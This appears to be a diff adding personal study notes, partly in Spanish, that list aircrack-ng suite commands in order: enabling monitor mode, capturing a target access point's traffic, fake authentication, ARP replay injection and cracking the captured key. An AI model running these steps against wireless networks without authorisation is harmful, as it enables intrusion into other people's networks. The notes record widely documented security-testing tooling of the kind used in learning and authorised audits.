@@ -1,0 +1,21 @@
+iwconfig   airmon-ng
+airmon-ng start wlan1
+ kill PID
+airodump-ng wlan01mon
+airodump-ng -c 11 --bssid MACADDRESS wlan1mon
+airodump-ng -w NOMBREARCHIVO -c CHANNEL --bssid mac wlan1mon
+aireplay-ng -1 0 -a MACDELAP -h MACDELCLIENTE wlan1mon
+aireplay-ng -3 -b macdelap -h macdelcliente wlan1mon
+ls
+aircrack-ng nombrearchivo-01.cap
+
+
+(to see what mode are we operating)
+iwconfig
+to change Mode:Managed to monitor mode
+ifconfig wlan0 down
+(siguiente comando mata el modo de conexion actual)
+airmon-ng check kill
+(enable monitor mode)
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
